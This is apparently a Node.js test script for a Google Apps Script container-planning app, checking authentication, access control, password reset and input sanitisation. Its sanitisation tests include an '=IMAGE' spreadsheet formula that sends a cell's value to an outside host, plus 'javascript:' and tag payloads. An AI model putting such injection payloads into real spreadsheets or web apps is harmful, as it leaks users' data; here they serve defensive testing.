const fs=require('fs'),crypto=require('crypto'),vm=require('vm');
const sheets={};
function mkSheet(name){const rows=[];const s={name,rows,
 getLastRow:()=>rows.length,getLastColumn:()=>rows.reduce((m,r)=>Math.max(m,r.length),0),
 getMaxRows:()=>5000,
 appendRow(r){rows.push(r.slice())},deleteRow(n){rows.splice(n-1,1)},
 getDataRange:()=>({getValues:()=>rows.map(r=>{const w=s.getLastColumn();const x=r.slice();while(x.length<w)x.push('');return x})}),
 getRange(r,c,nr,nc){nr=nr||1;nc=nc||1;const chain={getValues:()=>{const o=[];for(let i=0;i<nr;i++){const row=[];for(let j=0;j<nc;j++)row.push((rows[r-1+i]||[])[c-1+j]===undefined?'':rows[r-1+i][c-1+j]);o.push(row)}return o},
  setValue(v){while(rows.length<r)rows.push([]);rows[r-1][c-1]=v;return chain},setNumberFormat:()=>chain,setFontWeight:()=>chain,setBackground:()=>chain,setFontColor:()=>chain};return chain},
 setFrozenRows(){},autoResizeColumns(){},hideColumns(){},setColumnWidth(){}};return s}
const ss={getSheetByName:n=>sheets[n]||null,insertSheet:n=>sheets[n]=mkSheet(n)};
const cache={};const props={};
const mails=[];
const ctx={console,JSON,Date,Math,Number,String,Object,Array,Error,parseInt,
 SpreadsheetApp:{getActiveSpreadsheet:()=>ss},
 PropertiesService:{getScriptProperties:()=>({getProperty:k=>props[k]||null,setProperty:(k,v)=>props[k]=v,deleteProperty:k=>delete props[k]})},
 CacheService:{getScriptCache:()=>({get:k=>cache[k]===undefined?null:cache[k],put:(k,v)=>cache[k]=v,remove:k=>delete cache[k]})},
 LockService:{getScriptLock:()=>({waitLock(){},releaseLock(){}})},
 MailApp:{sendEmail:(to,s,b)=>mails.push({to,s,b})},
 Session:{getScriptTimeZone:()=>'UTC'},
 Logger:{log(){}},
 HtmlService:{XFrameOptionsMode:{}},
 Utilities:{DigestAlgorithm:{SHA_256:'sha256'},
  getUuid:()=>crypto.randomUUID(),
  computeDigest:(a,s)=>[...crypto.createHash('sha256').update(s).digest()].map(b=>b>127?b-256:b),
  computeHmacSha256Signature:(m,k)=>[...crypto.createHmac('sha256',k).update(m).digest()].map(b=>b>127?b-256:b),
  base64Encode:x=>Buffer.from(typeof x==='string'?x:x.map(b=>b&255)).toString('base64'),
  base64EncodeWebSafe:x=>Buffer.from(typeof x==='string'?x:x.map(b=>b&255)).toString('base64url')+'==',
  base64DecodeWebSafe:s=>[...Buffer.from(s,'base64url')].map(b=>b>127?b-256:b),
  newBlob:b=>({getDataAsString:()=>Buffer.from(b.map(x=>x&255)).toString()}),
  formatDate:(d)=>d.toISOString().slice(0,16).replace('T',' ')}};
vm.createContext(ctx);
vm.runInContext(fs.readFileSync(__dirname+'/../Code.gs','utf8'),ctx);
const run=(c)=>vm.runInContext(c,ctx);
const t=(n,ok)=>console.log(ok?'PASS':'FAIL',n);
const thr=(f)=>{try{f();return null}catch(e){return e.message}};
run("ensureSheetsExist()");
const admin=run("registerUser('admin@x.com','secret1','A Co','')");
const u1=run("registerUser('u1@x.com','secret1','B Co','')");
t('first=admin active, second inactive',admin.isFirstUser&&!u1.isFirstUser);
const la=run("loginUser('admin@x.com','secret1')"); t('admin login',la.success);
t('inactive blocked',run("loginUser('u1@x.com','secret1')").success===false);
// activate u1 directly in sheet
const us=sheets['Users'];const hm=us.rows[0];us.rows[2][hm.indexOf('Status')]='active';
const l1=run("loginUser('u1@x.com','secret1')"); t('u1 login after activate',l1.success);
const u2r=run("registerUser('u2@x.com','secret1','C Co','')");us.rows[3][hm.indexOf('Status')]='active';
const l2=run("loginUser('u2@x.com','secret1')");
ctx.TA=la.token;ctx.T1=l1.token;ctx.T2=l2.token;
t('no token rejected',!!thr(()=>run("getAllContainerPresets('')")));
t('shared presets visible to user',run("getAllContainerPresets(T1)").length===4);
run("saveContainerPreset(T1,{'Container Name':'MyBox','Length (cm)':500,'Width (cm)':200,'Height (cm)':200,'Max Payload (kg)':1000})");
t('u1 sees 5',run("getAllContainerPresets(T1)").length===5);
t('u2 sees 4 (not u1 custom)',run("getAllContainerPresets(T2)").length===4);
t('admin sees 5',run("getAllContainerPresets(TA)").length===5);
const myRow=run("getAllContainerPresets(T1)").find(c=>c['Container Name']==='MyBox')._row; ctx.R=myRow;
t('u2 cannot delete u1 preset',/权限/.test(thr(()=>run("deleteContainerPreset(T2,R)"))||''));
t('u1 cannot delete shared preset',/权限/.test(thr(()=>run("deleteContainerPreset(T1,2)"))||''));
t('header row protected',/不存在/.test(thr(()=>run("deleteContainerPreset(TA,1)"))||''));
t('invalid preset rejected',!!thr(()=>run("saveContainerPreset(T1,{'Container Name':'','Length (cm)':0})")));
// history
run("saveCalculationHistory(T1,'calc1',{totalItems:1,totalContainers:1,summaryText:'20GP'},{items:[{id:1}]})");
t('u1 history 1',run("getCalculationHistory(T1)").length===1);
t('u2 history 0',run("getCalculationHistory(T2)").length===0);
t('admin history 1 w/ owner',run("getCalculationHistory(TA)")[0].owner==='u1@x.com');
const hr=run("getCalculationHistory(T1)")[0].row;ctx.H=hr;
t('u2 cannot load u1 history',!!thr(()=>run("loadCalculation(T2,H)")));
t('u1 loads own',run("loadCalculation(T1,H)").items.length===1);
t('u1 delete own',run("deleteCalculationHistory(T1,H)").length===0);
// legacy sheet migration: header without Owner
sheets['Item Master'].rows[0]=sheets['Item Master'].rows[0].filter(h=>h!=='Owner');
run("ensureSheetsExist()");t('Owner col re-added',sheets['Item Master'].rows[0].includes('Owner'));
mails.length=0;
run("requestPasswordReset('u1@x.com')");
t('mail sent',mails.length===1&&/\d{6}/.test(mails[0].b));
t('cooldown (no 2nd mail)',(run("requestPasswordReset('u1@x.com')"),mails.length===1));
t('unknown email same msg, no mail',(run("requestPasswordReset('nobody@x.com')"),mails.length===1));
const code=mails[0].b.match(/\d{6}/)[0];
t('wrong code rejected',!!thr(()=>run("resetPasswordWithCode('u1@x.com','000000','newpass1')")));
t('old token revoked after reset',(run(`resetPasswordWithCode('u1@x.com','${code}','newpass1')`),!!thr(()=>run("getAllContainerPresets(T1)"))));
t('login with new pw',run("loginUser('u1@x.com','newpass1')").success);
t('code single-use',!!thr(()=>run(`resetPasswordWithCode('u1@x.com','${code}','another1')`)));
// ---- 回归测试: 本轮修复 ----
t('admin can edit own company without being logged out',(()=>{const e=thr(()=>run("adminUpdateUser(TA,'admin@x.com',{companyName:'New Co',role:'admin',status:'active'})"));return e===null&&!thr(()=>run("getAllUsers(TA)"))})());
t('admin cannot demote self',/管理员权限/.test(thr(()=>run("adminUpdateUser(TA,'admin@x.com',{role:'user'})"))||''));
t('invalid role rejected',!!thr(()=>run("adminUpdateUser(TA,'u2@x.com',{role:'<img>'})")));
t('role change revokes target token',(run("adminUpdateUser(TA,'u2@x.com',{role:'user',status:'inactive'})"),!!thr(()=>run("getAllContainerPresets(T2)"))));
t('no Date objects in returned user',!Object.values(run("loginUser('admin@x.com','secret1')").user).some(v=>v instanceof Date));
run("registerUser('evil@x.com','secret1','=IMAGE(\"https://e/?\"&B2)','+cmd')");
const ev=sheets['Users'].rows.find(r=>r[0]==='evil@x.com');
t('formula text neutralised',ev[5][0]==="'"&&ev[6][0]==="'");
t('email starting with = rejected',!!thr(()=>run("registerUser('=1+1@x.com','secret1','','')")));
t('bad logo rejected',!!thr(()=>run("updateMyProfile(TA,{logoDataUrl:'javascript:alert(1)'})")));
t('good logo accepted',run("updateMyProfile(TA,{logoDataUrl:'data:image/png;base64,AAAA'})").LogoDataUrl.length>0);
// 历史记录用稳定 Id
run("saveCalculationHistory(TA,'h1',{totalItems:1,totalContainers:1,summaryText:'x'},{items:[{id:1}]})");
run("saveCalculationHistory(TA,'h2',{totalItems:2,totalContainers:1,summaryText:'y'},{items:[{id:1},{id:2}]})");
let hl=run("getCalculationHistory(TA)");ctx.ID1=hl.find(h=>h.name==='h1').id;ctx.ID2=hl.find(h=>h.name==='h2').id;
t('history has ids',!!ctx.ID1&&ctx.ID1!==ctx.ID2);
t('load by id',run("loadCalculation(TA,ID2)").items.length===2);
run("deleteCalculationHistory(TA,ID1)");
t('delete by id removes the right record, other still loads',run("loadCalculation(TA,ID2)").items.length===2&&!run("getCalculationHistory(TA)").some(h=>h.id===ctx.ID1));
t('unknown id rejected',!!thr(()=>run("loadCalculation(TA,'nope-id')")));
